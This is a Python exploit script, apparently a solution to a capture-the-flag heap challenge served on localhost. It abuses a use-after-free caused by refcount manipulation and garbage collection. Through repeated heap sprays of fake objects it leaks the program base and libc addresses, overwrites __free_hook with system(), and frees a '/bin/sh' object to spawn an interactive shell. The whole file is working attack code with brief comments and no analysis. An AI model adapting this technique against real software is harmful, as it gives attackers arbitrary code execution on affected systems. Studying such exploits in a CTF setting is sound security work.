import socket
from nonblockingsocket import nonblockingsocket as nbsocket
import struct

def read_until(word):
    return stream.readuntil(word,0.1)

def write_p(string):
    s.send(string + "\n")

def allocate_fill(idx,string):
    read_until(">")
    write_p("1")
    write_p(str(idx))
    write_p(string)
    read_until("\n")

def allocate(idx):
    read_until(">")
    write_p("1")
    read_until("idx? ")
    write_p(str(idx))

def delete(idx):
    read_until(">")
    write_p("2")
    read_until("idx? ")
    write_p(str(idx))

def use(idx):
    read_until(">")
    write_p("3")
    read_until("idx? ")
    write_p(str(idx))

def garbage_collect():
    read_until(">")
    write_p("4")

def heapspray(string):
    read_until(">")
    write_p("5")
    write_p(string)


solved = 0
while(not solved):
    try:
        try:
            s.close()
            stream.close()
        except:
            pass

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("localhost",9027))
        stream=nbsocket(s)

        # allocate initial object with random padding
        allocate_fill(0,"A"*(256+16))

        # delete non-existent refereneces to make the refcount = 0
        delete(13)

        # run garbage collection which will free the object because refcount = 0
        garbage_collect()

        # allocate some objects to overwrite
        for i in range(0,5):
                heapspray("B"*256+ "read" + "\x00"*12)

        # Use object 
        use(0)
        data = read_until(">")
        if data is not None:
            if "BBBB" in data:
                type_address = struct.unpack('<Q', data[0:8])[0]
                #print "type address -> 0x{:016x}".format(type_address)
            else:
                continue
        else:
            continue
        base_address = type_address - 0x1258
        g_buf_offset = 0x202040
        g_buf_address = base_address + g_buf_offset
        array_buffer_offset = 0x202080
        array_buffer_address = base_address + array_buffer_offset


        # set ArrayBuffer[1] above g_buf for later infoleak of libc functions
        # allocate initial object with random padding
        allocate_fill(0,"A"*(256+16))
        # delete non-existent refereneces to make the refcount = 0
        delete(13)
        # run garbage collection which will free the object because refcount = 0
        garbage_collect()
        # allocate some objects to overwrite
        fake_array = struct.pack("<Q", array_buffer_address+8)
        fake_array += struct.pack("<Q", 0x8) 
        fake_array += struct.pack("<Q", g_buf_address) #*type
        for i in range(0,5):
            heapspray(fake_array*10 + "A"*16 + "write" + "\x00"*11)
        # Use object 
        use(0)
        if read_until("data?") is None:
            continue
        allobj_pointer_above_gbuf = g_buf_address-0x110
        s.send(struct.pack("<Q", allobj_pointer_above_gbuf))
        print "[+] alignment  1 correct"


        # now set ArrayBuffer[2] = "read"
        # allocate object again
        allocate_fill(0,"A"*(256+16))
        # delete non-existent refereneces to make the refcount = 0
        delete(13)
        # run garbage collection which will free the object because refcount = 0
        garbage_collect()
        # Heap spray with fake array ArrayBuffer[2]
        fake_array = struct.pack("<Q", array_buffer_address+16) #*wdata
        fake_array += struct.pack("<Q", 0x5) # length
        fake_array += struct.pack("<Q", g_buf_address) #*type
        for i in range(0,5):
            heapspray(fake_array*10 + "A"*16 + "write" + "\x00"*11)
        # Use overwritten object
        use(0)
        if read_until("data?") is None:
            continue
        s.send("read" + "\x00")
        print "[+] alignment 2 correct"

        # STEP 3
        # set g_buf to ArrayBuffer[3] address
        # allocate initial object with random padding
        allocate_fill(0,"A"*(256+16))
        # delete non-existent refereneces to make the refcount = 0
        delete(13)
        # run garbage collection which will free the object because refcount = 0
        garbage_collect()
        # allocate some objects to overwrite
        fake_array = struct.pack("<Q", g_buf_address)
        fake_array += struct.pack("<Q", 0x8) 
        for i in range(0,5):
            heapspray(fake_array*16+ "write" + "\x00"*11)
        # Use object 
        use(0)
        if read_until("data?") is None:
            continue
        s.send(struct.pack("<Q", array_buffer_address+16))
        print "[+] alignment 3 correct"


        # STEP 4
        # use ArrayBuffer[1] to infoleak libc addresses
        # pwnable ssh server uses libc6-i386_2.24-7ubuntu2_amd64
        use(1)
        data = read_until(">")
        free_address = struct.unpack('<Q', data[0:8])[0]
        free_offset = 0x83a70
        freehook_offset = 0x3c57a8
        libc_base = free_address - free_offset
        system_offset = 0x45380
        system_address = libc_base + system_offset
        freehook_address = libc_base + freehook_offset
        #print "system address ->" + hex(system_address)
        #print "freehook address ->" + hex(freehook_address)

        # STEP 5
        # overwrite __free_hook in libc 
        # allocate initial object with random padding
        allocate_fill(0,"A"*(256+16))
        # delete non-existent refereneces to make the refcount = 0
        delete(13)
        # run garbage collection which will free the object because refcount = 0
        garbage_collect()
        # allocate some objects to overwrite
        fake_array = struct.pack("<Q", freehook_address)
        fake_array += struct.pack("<Q", 0x8) 
        fake_array += struct.pack("<Q", g_buf_address) #*type
        for i in range(0,5):
            heapspray(fake_array*10 + "A"*16 + "write" + "\x00"*11)
        # Use object 
        use(0)
        if read_until("data?") is None:
            continue
        s.send(struct.pack("<Q", system_address))
        print "[+] alignment  4 correct"

        # STEP 5
        # set theOBJ = /bin/sh and call gc to call system and get shell
        allocate_fill(0,"/bin/sh" +'\x00' + "A"*(256+16-8))
        # delete non-existen reference to get refcount = 0
        delete(13)
        # run garbace collection to get shell
        garbage_collect()

        solved = 1
    except:
        continue

print "[+] Exploit successful here is your shell"
s.settimeout(0.2)
while(True):
    try:
        time.sleep(0.1)
        sys.stdout.write(s.recv(512))
    except:
        s.send(raw_input()+'\n')
